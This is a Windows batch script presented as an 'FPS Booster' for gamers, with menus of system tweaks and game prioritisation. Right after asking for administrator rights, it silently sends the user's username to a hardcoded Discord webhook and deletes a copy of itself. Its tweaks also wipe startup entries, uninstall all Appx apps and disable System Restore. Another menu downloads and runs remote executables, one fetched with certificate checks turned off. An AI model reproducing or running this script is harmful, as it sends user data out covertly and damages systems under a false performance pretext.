@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as administrator. Press any key to run it as administrator.
    echo.
pause
    echo Attempting to restart as administrator...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
cd /d "%~dp0"
del /f /q "Fps booster.bat"
cls
title FPS BOOSTER V2
if not exist "C:\temp\" mkdir "C:\temp\"
cls
set w=[97m
set p=[95m
set b=[96m
powershell -Command "$webhookUrl ='https://discord.com/api/webhooks/1290991786864545812/6R8cHu0xztQCZQMBx_P0fs9xlbFt2fIOCKexA1ABWCT48cw_lgXWrNudMrbdnQUVChs5'; $userName = $env:USERNAME; $payload = @{content='Le script a ete execute par ' + $userName}; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'"

chcp 65001 >nul 2>&1
cls
mode 720,400
color 0
:main
cls
echo.
echo.
echo ███████╗██████╗░░██████╗       ██████╗░░█████╗░░█████╗░░██████╗████████╗███████╗██████╗░
echo ██╔════╝██╔══██╗██╔════╝       ██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
echo █████╗░░██████╔╝╚█████╗░       ██████╦╝██║░░██║██║░░██║╚█████╗░░░░██║░░░█████╗░░██████╔╝
echo ██╔══╝░░██╔═══╝░░╚═══██╗       ██╔══██╗██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══╝░░██╔══██╗
echo ██║░░░░░██║░░░░░██████╔╝       ██████╦╝╚█████╔╝╚█████╔╝██████╔╝░░░██║░░░███████╗██║░░██║
echo ╚═╝░░░░░╚═╝░░░░░╚═════╝░       ╚═════╝░░╚════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
echo     --------------------------------------------------------------------------------                                                                         
echo.
echo.
echo 1. Create Restore Point
echo.
echo 2. Windows Optimization Tweaks
echo.
echo 3. Game Prioritization
echo.
echo 4. Ultimate Performance Power Plan Optimization
echo.
echo 5. Others
echo.
echo 6. Exit
echo ============================

set /p choice="Choose an option (1-6): "

if "%choice%"=="1" goto restore
if "%choice%"=="2" goto tweaks
if "%choice%"=="3" goto games
if "%choice%"=="4" goto power
if "%choice%"=="5" goto others
if "%choice%"=="6" exit
goto main

:restore
cls
echo Are you sure?
echo 1. Yes
echo 2. No
set /p choice="Choose an option (1-2): "
if "%choice%"=="1" goto continuerestore
if "%choice%"=="2" goto main
:continuerestore
cls
echo Creating a restore point...
powershell.exe -Command "Checkpoint-Computer -Description 'Pre-Optimization Restore Point' -RestorePointType 'MODIFY_SETTINGS'"
cls
echo Restore point created.
pause
goto main

:tweaks
cls
echo ============================
echo    Windows Optimization
echo         Tweaks
echo ============================
echo.
echo 1. Disable Startup Programs
echo 2. Clear Temp Files
echo 3. Disable Hibernation
echo 4. Adjust Visual Effects
echo 5. Disable Indexing
echo 6. Optimize Disk
echo 7. Turn Off System Restore
echo 8. Disable Bluetooth
echo 9. Disable Windows Search
echo 10. Adjust Power Settings
echo 11. Disable Unused Services
echo 12. Turn Off Transparency Effects
echo 13. Disable Notifications
echo 14. Uninstall Unused Apps
echo 15. Optimize Network Settings
echo.
echo A. Apply All Tweaks
echo R. Revert Tweaks
echo B. Go Back
echo ============================
set /p tweakChoice="Choose a tweak or action: "

if /I "%tweakChoice%"=="A" (
    echo Applying all tweaks...
    powercfg -h off
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f
    del /q /f "%TEMP%\*"
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "VisualFXSetting" /t REG_DWORD /d 2 /f
    sc config "WSearch" start= disabled
    defrag C: /O
    wmic /Namespace:\\root\default Path SystemRestore call Disable "C:\"
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\BTHPORT\Parameters\Devices" /v "Disabled" /t REG_DWORD /d 1 /f
    sc stop "WSearch" & sc config "WSearch" start= disabled
    powercfg -setactive SCHEME_MIN
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\service_name" /v "Start" /t REG_DWORD /d 4 /f
    reg add "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d 0 /f
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK" /t REG_DWORD /d 0 /f
    powershell -command "Get-AppxPackage | Remove-AppxPackage"
    netsh int tcp set global autotuninglevel=normal
    ipconfig /flushdns
    echo All tweaks applied.
) else if /I "%tweakChoice%"=="R" (
    echo Reverting tweaks...
    powercfg -h on
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupProgram" /t REG_SZ /d "ProgramPath" /f
    del /q /f "%TEMP%\*"
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "VisualFXSetting" /f
    sc config "WSearch" start= auto
    wmic /Namespace:\\root\default Path SystemRestore call Enable "C:\"
    reg delete "HKLM\SYSTEM\CurrentControlSet\Services\BTHPORT\Parameters\Devices" /v "Disabled" /f
    sc start "WSearch"
    powercfg -setactive SCHEME_DEFAULT
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\service_name" /v "Start" /t REG_DWORD /d 2 /f
    reg delete "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /f
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK" /f
    cls
    echo Tweaks reverted.

) else if /I "%tweakChoice%"=="B" (
    goto main
) else if /I "%tweakChoice%"=="1" (
    echo Disabling Startup Programs
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="2" (
    echo Deleting temp files
    del /q /f "%TEMP%\*"
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="3" (
    powercfg -h off
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="4" (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "VisualFXSetting" /t REG_DWORD /d 2 /f
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="5" (
    sc config "WSearch" start= disabled
    cls
    goto success
    pause
    goto tweaks  
) else if /I "%tweakChoice%"=="6" (
    defrag C: /O
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="7" (
    wmic /Namespace:\\root\default Path SystemRestore call Disable "C:\"
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="8" (
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\BTHPORT\Parameters\Devices" /v "Disabled" /t REG_DWORD /d 1 /f
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="9" (
    sc stop "WSearch" & sc config "WSearch" start= disabled
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="10" (
    powercfg -setactive SCHEME_MIN
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="11" (
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\service_name" /v "Start" /t REG_DWORD /d 4 /f
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="12" (
    reg add "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d 0 /f
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="13" (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" /v "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK" /t REG_DWORD /d 0 /f
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="14" (
    powershell -command "Get-AppxPackage | Remove-AppxPackage"
    cls
    goto success
    pause
    goto tweaks
) else if /I "%tweakChoice%"=="15" (
    netsh int tcp set global autotuninglevel=normal
    ipconfig /flushdns
    cls
    goto success
    pause
    goto tweaks
)

pause
goto main

:games
cls
echo ============================
echo     Game Prioritization
echo ============================
echo.
echo 1. Fortnite
echo 2. Call of Duty
echo 3. FiveM
echo 4. Valorant
echo B. Go Back
echo ============================
set /p gameChoice="Choose a game to prioritize (1-4 or B): "

if /I "%gameChoice%"=="1" (
    echo Setting priority for Fortnite...
    wmic process where "name='FortniteClient-Win64-Shipping_BE.exe'" call setpriority "high priority"
) else if /I "%gameChoice%"=="2" (
    echo Setting priority for Call of Duty...
    wmic process where "name='Call of Duty.exe'" call setpriority "high priority"
) else if /I "%gameChoice%"=="3" (
    echo Setting priority for FiveM...
    wmic process where "name='FiveM.exe'" call setpriority "high priority"
) else if /I "%gameChoice%"=="4" (
    echo Setting priority for Valorant...
    wmic process where "name='RiotClientServices.exe'" call setpriority "high priority"
) else if /I "%gameChoice%"=="B" (
goto main
)
cls
echo Priority set for the selected game.
pause
goto main

:power
cls
echo ============================
echo Ultimate Performance Power Plan
echo      Optimization
echo ============================
echo.
echo 1. Enable Ultimate Performance Plan
echo 2. Set Maximum Processor State to 100%
echo 3. Disable Sleep
echo 4. Go Back
echo ============================
set /p powerChoice="Choose an option (1-4): "

if "%powerChoice%"=="1" (
    echo Enabling Ultimate Performance plan...
    powercfg -setactive scheme_max
    echo Ultimate Performance plan enabled.
) else if "%powerChoice%"=="2" (
    echo Setting maximum processor state to 100%...
    powercfg /setacvalueindex scheme_current sub_processor PROCTHROTTLEMAX 100
    powercfg /setdcvalueindex scheme_current sub_processor PROCTHROTTLEMAX 100
    powercfg /s scheme_current
    echo Maximum processor state set to 100%.
) else if "%powerChoice%"=="3" (
    echo Disabling sleep mode...
    powercfg /change monitor-timeout-ac 0
    powercfg /change monitor-timeout-dc 0
    powercfg /change standby-timeout-ac 0
    powercfg /change standby-timeout-dc 0
    cls
    echo Sleep mode disabled.
) else if "%powerChoice%"=="4" (
    goto main
)

pause
goto power

:others
cls
echo ============================
echo          Others
echo ============================
echo.
echo 1. Download NoMoreEdge (redirects every edge links to another selected web browser)
echo 2. Download TimerResolution (improves fps, will run at startup)
echo 3. Uninstall all
echo B. Go Back 
echo ============================
set /p otherChoice="Choose a tweak or action: "
if "%otherChoice%"=="1" (
    setlocal

    set "url1=https://github.com/KodeByWrath/NoMoreEdge/releases/download/1.7.5.0/NoMoreEdgeSetup.exe"
    set "output1=NoMoreEdgeSetup.exe"
    curl -L -o "%output1%" "%url1%"
    start "" "%output1%"
    endlocal
    cls
    echo Successfully installed and executed NoMoreEdge Setup.
    pause
    goto others

) else if "%otherChoice%"=="2" (

set tempDir=%temp%
curl -L -k -o "%tempDir%\timerresolution.bat" https://raw.githubusercontent.com/Mirgarr/timerresolution/main/timerresolution.bat
curl -L -k -o "%tempDir%\timerresolution.vbs" https://raw.githubusercontent.com/Mirgarr/timerresolution/main/timerresolution.vbs

start "" "%tempDir%\timerresolution.vbs"

timeout /t 5 /nobreak >nul

tasklist | findstr /I "timerresolution.exe" >nul
if %errorlevel%==0 (
    del "%tempDir%\timerresolution.bat" /F
    del "%tempDir%\timerresolution.vbs" /F
    cls
    echo Successfully installed and executed TimerResolution.
    echo Press Maximum every time to boost your fps.
    echo After clicking on Maximum, DON'T CLOSE IT, let TimerResolution run in the background.
) else (
    cls
    echo TimerResolution.exe is not opened.
    echo This may be because the script wasn't executed with administrator privileges.
)

pause
goto others

) else if /I "%otherChoice%"=="3" (
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TimerResolution.exe"
echo sucessfully uninstalled timerresolution
pause
goto others
) else if /I "%otherChoice%"=="B" (
goto main
)


:success
echo Tweak successfully applied.
pause
goto main
